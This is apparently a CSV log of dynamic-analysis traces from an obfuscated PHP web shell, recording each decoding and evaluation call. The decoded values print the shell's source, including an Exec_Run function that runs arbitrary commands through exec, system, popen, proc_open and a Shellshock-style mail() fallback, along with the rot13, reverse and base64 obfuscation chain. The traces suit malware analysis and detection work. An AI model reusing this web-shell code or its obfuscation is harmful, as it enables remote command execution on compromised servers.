uuid,file_md5,index,source,target,argc,argv,return,dynamic
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,23,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,24,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,25,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,26,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,27,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,28,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,29,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,30,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,31,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0jBmIzpxNvolIUqyWKPX0Ds7xvVUcUB092ZWOQpIyRZMO1GcOaqCu2omDRqkSJFz9zq00wVbHTMiAHoX1mpyWUWtH2pfI2B0IUp0I3ox0mpyWUWtxvVvNFCuNPq1O""]]}","{""value"": ""MaIhL3Eco24tEKuyL19FqJ4bWTAgMPxAPafAPtxxpzImVQ0tWlp7QDbWnJLbMaIhL3Eco25sMKucp3EmXPqyrTIwWlxcr0OyrTIwXPEwoJDfWUWyplx7WUWyplN9VTcinJ""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,32,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEKuyL19FqJ4bWTAgMPxAPafAPtxxpzImVQ0tWlp7QDbWnJLbMaIhL3Eco25sMKucp3EmXPqyrTIwWlxcr0OyrTIwXPEwoJDfWUWyplx7WUWyplN9VTcinJ""]]}","{""value"": ""ZnVuY3Rpb24gRXhlY19SdW4oJGNtZCkNCnsNCgkkcmVzID0gJyc7DQoJaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpe0BleGVjKCRjbWQsJHJlcyk7JHJlcyA9IGpvaW""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,33,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRXhlY19SdW4oJGNtZCkNCnsNCgkkcmVzID0gJyc7DQoJaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpe0BleGVjKCRjbWQsJHJlcyk7JHJlcyA9IGpvaW""]]}","{""value"": ""function Exec_Run($cmd)\r\n{\r\n\t$res = '';\r\n\tif(function_exists('exec')){@exec($cmd,$res);$res = join(\""\\n\"",$res);}\r\n\telseif(function_""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,34,pazihj,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function Exec_Run($cmd)\r\n{\r\n\t$res = '';\r\n\tif(function_exists('exec')){@exec($cmd,$res);$res = join(\""\\n\"",$res);}\r\n\telseif(function_""]]}","{""value"": ""\\x00lambda_2""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,35,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function Exec_Run($cmd)\r\n{\r\n\t$res = '';\r\n\tif(function_exists('exec')){@exec($cmd,$res);$res = join(\""\\n\"",$res);}\r\n\telseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}\r\n\telseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}\r\n\telseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}\r\n\telseif(@is_resource($f=@popen($cmd,'r'))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}\r\n\telseif(substr(dirname($_SERVER[\""SCRIPT_FILENAME\""]),0,1)!=\""/\""&&class_exists('COM')){$w=new COM('WScript.shell');$e=$w->exec($cmd);$f=$e->StdOut();$res=$f->ReadAll();}\r\n\telseif(function_exists('proc_open')){$length = strcspn($cmd,\"" \\t\"");$token = substr($cmd, 0, $length);if (isset($aliases[$token]))$cmd=$aliases[$token].substr($cmd, $length);$p = proc_open($cmd,array(1 => array('pipe', 'w'),2 => array('pipe', 'w')),$io);while (!feof($io[1])) {$res .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');}while (!feof($io[2])) {$res .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');}fclose($io[1]);fclose($io[2]);proc_close($p);}\r\n\telseif(function_exists('mail')){if(strstr(readlink(\""/bin/sh\""), \""bash\"") != FALSE){$tmp = tempnam(\"".\"",\""data\"");putenv(\""PHP_LOL=() { x; }; $cmd >$tmp 2>&1\"");mail(\""a@127.0.0.1\"",\""\"",\""\"",\""\"",\""-bv\"");}else $res=\""Not vuln (not bash)\"";$output = @implode('',@file($tmp));@unlink($tmp);if($output != \""\"") $res=$output;else $res=JmCode(\""=4vofIaqtD3ohOvpiOPY0IUp0I3ot8zG\"");}\r\n\treturn $res;\r\n}}""]]}","{""value"": ""003E""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,36,pazihj,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,37,eval,pazihj,2.0,"{""value"": [[0, ""MtrIng"", ""=0aPAfGXbHJnxOPVX0jBc01MgyTWoAKMaSJocEPXyE2owITMsEwAyAKLvOlobAJMtNvPAfGXaLJna9FMaSJocOvByOKr01PqhITqh92DatvpyEJLyuTVtbDQ7xFPX0tV3R""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,38,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,39,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,40,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,41,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,42,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,43,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,44,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,45,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,46,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,47,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,48,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""=0aPAfGXbHJnxOPVX0jBc01MgyTWoAKMaSJocEPXyE2owITMsEwAyAKLvOlobAJMtNvPAfGXaLJna9FMaSJocOvByOKr01PqhITqh92DatvpyEJLyuTVtbDQ7xFPX0tV3R""]]}","{""value"": ""MaIhL3Eco24tL3AmK2ygMltxnJ1aXKfAPtxxnJ1uM2ImVQ0tLKWlLKxbQDbWVzI4MFV9Ct0XPFWFZTkUG0EfnRI3DH9OF0yODHSODHSDYl8iq0SOqzAvE3uiH0IbHP8iY3""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,49,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tL3AmK2ygMltxnJ1aXKfAPtxxnJ1uM2ImVQ0tLKWlLKxbQDbWVzI4MFV9Ct0XPFWFZTkUG0EfnRI3DH9OF0yODHSODHSDYl8iq0SOqzAvE3uiH0IbHP8iY3""]]}","{""value"": ""ZnVuY3Rpb24gY3NzX2ltZygkaW1nKXsNCgkkaW1hZ2VzID0gYXJyYXkoDQoJImV4ZSI9Pg0KCSJSMGxHT0RsaEV3QU9BS0lBQUFBQUFQLy8vd0FBdmNiR3hvU0VoUC8vL3""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,50,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gY3NzX2ltZygkaW1nKXsNCgkkaW1hZ2VzID0gYXJyYXkoDQoJImV4ZSI9Pg0KCSJSMGxHT0RsaEV3QU9BS0lBQUFBQUFQLy8vd0FBdmNiR3hvU0VoUC8vL3""]]}","{""value"": ""function css_img($img){\r\n\t$images = array(\r\n\t\""exe\""=>\r\n\t\""R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAA""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,51,pazihj,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function css_img($img){\r\n\t$images = array(\r\n\t\""exe\""=>\r\n\t\""R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAA""]]}","{""value"": ""\\x00lambda_3""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,52,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function css_img($img){\r\n\t$images = array(\r\n\t\""exe\""=>\r\n\t\""R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7\"".\r\n\t\""WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt\"".\r\n\t\""xhIAOw==\"",\r\n\t\""dir\""=>\""R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAA\"".\r\n\t\""AAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdE\"".\r\n\t\""oMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=\"",\r\n\t\""txt\""=>\r\n\t\""R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ\"".\r\n\t\""SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7\"".\r\n\t\""UpPWG3Ig6Hq/XmRjuZwkAAA7\"",\r\n\t\""html\""=>\r\n\t\""R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz\"".\r\n\t\""c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P\"".\r\n\t\""KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk\"".\r\n\t\""Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR\"".\r\n\t\""ADs=\"",\r\n\t\""js\""=>\r\n\t\""R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH\"".\r\n\t\""k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs\"".\r\n\t\""a00AjYYBbc/o9HjNniUAADs=\"",\r\n\t\""xml\""=>\r\n\t\""R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA\"".\r\n\t\""gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n\t\""AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx\"".\r\n\t\""OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ\"".\r\n\t\""IQA7\"",\r\n\t\""mp3\""=>\r\n\t\""R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU\"".\r\n\t\""aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc\"".\r\n\t\""IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=\"",\r\n\t\""img\""=>\r\n\t\""R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA\"".\r\n\t\""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci\"".\r\n\t\""Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd\"".\r\n\t\""FxEAOw==\"",\r\n\t\""title\""=>\""R0lGODlhDgAOAMQAAOGmGmZmZv//xVVVVeW6E+K2F/+ZAHNzcf+vAGdnaf/AAHt1af+\"".\r\n\t\""mAP/FAP61AHt4aXNza+WnFP//zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n\t\""ACH5BAAHAP8ALAAAAAAOAA4AAAVJYPIcZGk+wUM0bOsWoyu35KzceO3sjsTvDR1P4uMFDw2EEkGUL\"".\r\n\t\""I8NhpTRnEKnVAkWaugaJN4uN0y+kr2M4CIycwEWg4VpfoCHAAA7\"",\r\n\t\""rar\""=>\""R0lGODlhEAAQAPf/AAAAAAAAgAAA/wCAAAD/AACAgIAAAIAAgP8A/4CAAP//AMDAwP///wAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"".\r\n    \""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/ACH5BAEKAP8ALAAAAAAQABAAAAiFAP0YEEhwoEE/\"".\r\n    \""/xIuEJhgQYKDBxP+W2ig4cOCBCcyoHjAQMePHgf6WbDxgAIEKFOmHDmSwciQIDsiXLgwgZ+b\"".\r\n    \""OHOSXJiz581/LRcE2LigqNGiLEkKWCCgqVOnM1naDOCHqtWbO336BLpzgAICYMOGRdgywIIC\"".\r\n    \""aNOmRcjVj02tPxPCzfkvIAA7\""\r\n\t);\r\n  header('Content-type: image/gif');\r\n  echo base64_decode($images[$img]);\r\n  die();\r\n}}""]]}","{""value"": ""003E""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,53,pazihj,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,54,eval,pazihj,2.0,"{""value"": [[0, ""MtrIng"", ""==DsX0DsWbDQ7fJLyWaL7pPq4E3Wt4zp1EKMlOvB0kJquMJMxyNVtbDQ7fJLyWaL7pvpuW3Wt4zp1EKMlOvBv82pcWPVyAKLwcwVjyzrvNFMmS2LtbwV6qzYvNFMmS2Ltb""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,55,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}","{""value"": ""Str_rot13""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,56,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}","{""value"": ""rqbprQ_46rfnO""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,57,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}","{""value"": ""Onfr64_Qrpbqr""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,58,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}","{""value"": ""Base64_Decode""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,59,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""T2kw""]]}","{""value"": ""Oi0""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,60,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""MDl5""]]}","{""value"": ""09y""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,61,pazihj,strtr,3.0,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}","{""value"": ""h9Jn0Azo1M0KyEKLyW3D""}","[0, 0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,62,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}","{""value"": ""D3WyLKEyK0M1ozA0nJ9h""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,63,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}","{""value"": ""Q3JlYXRlX0Z1bmN0aW9u""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,64,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,65,pazihj,strrev,1.0,"{""value"": [[0, ""str"", ""==DsX0DsWbDQ7fJLyWaL7pPq4E3Wt4zp1EKMlOvB0kJquMJMxyNVtbDQ7fJLyWaL7pvpuW3Wt4zp1EKMlOvBv82pcWPVyAKLwcwVjyzrvNFMmS2LtbwV6qzYvNFMmS2Ltb""]]}","{""value"": ""MaIhL3Eco24tL3AmK3Abo3qcoJpbWTMcoTHcrj0XPFEcqQ1mqJWmqUVbWTMcoTHfYGZcBj0XPKA3nKEwnPtxnKDcrj0XPDywLKAyVPWdpTpvBvOwLKAyVPWanJLvBvOwLK""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,66,pazihj,str_rot13,1.0,"{""value"": [[0, ""str"", ""MaIhL3Eco24tL3AmK3Abo3qcoJpbWTMcoTHcrj0XPFEcqQ1mqJWmqUVbWTMcoTHfYGZcBj0XPKA3nKEwnPtxnKDcrj0XPDywLKAyVPWdpTpvBvOwLKAyVPWanJLvBvOwLK""]]}","{""value"": ""ZnVuY3Rpb24gY3NzX3Nob3dpbWcoJGZpbGUpew0KCSRpdD1zdWJzdHIoJGZpbGUsLTMpOw0KCXN3aXRjaCgkaXQpew0KCQljYXNlICJqcGciOiBjYXNlICJnaWYiOiBjYX""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,67,pazihj,base64_decode,1.0,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gY3NzX3Nob3dpbWcoJGZpbGUpew0KCSRpdD1zdWJzdHIoJGZpbGUsLTMpOw0KCXN3aXRjaCgkaXQpew0KCQljYXNlICJqcGciOiBjYXNlICJnaWYiOiBjYX""]]}","{""value"": ""function css_showimg($file){\r\n\t$it=substr($file,-3);\r\n\tswitch($it){\r\n\t\tcase \""jpg\"": case \""gif\"": case \""bmp\"": case \""png\"": case \""ico\"":""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,68,pazihj,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function css_showimg($file){\r\n\t$it=substr($file,-3);\r\n\tswitch($it){\r\n\t\tcase \""jpg\"": case \""gif\"": case \""bmp\"": case \""png\"": case \""ico\"":""]]}","{""value"": ""\\x00lambda_4""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,69,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function css_showimg($file){\r\n\t$it=substr($file,-3);\r\n\tswitch($it){\r\n\t\tcase \""jpg\"": case \""gif\"": case \""bmp\"": case \""png\"": case \""ico\"": return 'img';break;\r\n\t\tcase \""htm\"": case \""tml\"": return 'html';break;\r\n\t\tcase \""exe\"": case \""com\"": return 'exe';break;\r\n\t\tcase \""xml\"": case \""doc\"": return 'xml';break;\r\n\t\tcase \"".js\"": case \""vbs\"": return 'js';break;\r\n\t\tcase \""mp3\"": case \""wma\"": case \""wav\"": case \""swf\"": case \"".rm\"": case \""avi\"":case \""mp4\"":case \""mvb\"": return 'mp3';break;\r\n\t\tcase \""rar\"": case \""tar\"": case \"".gz\"": case \""zip\"":case \""iso\"": return 'rar';break;\r\n  \tdefault: return 'txt';break;\r\n\t}\r\n}}""]]}","{""value"": ""003E""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,70,pazihj,__lambda_func,0.0,"{""value"": []}","{""value"": ""void""}",[]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,71,eval,pazihj,2.0,"{""value"": [[0, ""MtrIng"", ""=0aPAfwVhkIL0STMxVPViu2LyytPAfKXuEKLxEPXh9SogEUnt42ocE3LhIaM""], [1, ""show"", 1]]}","{""value"": ""void""}","[0, 0]"
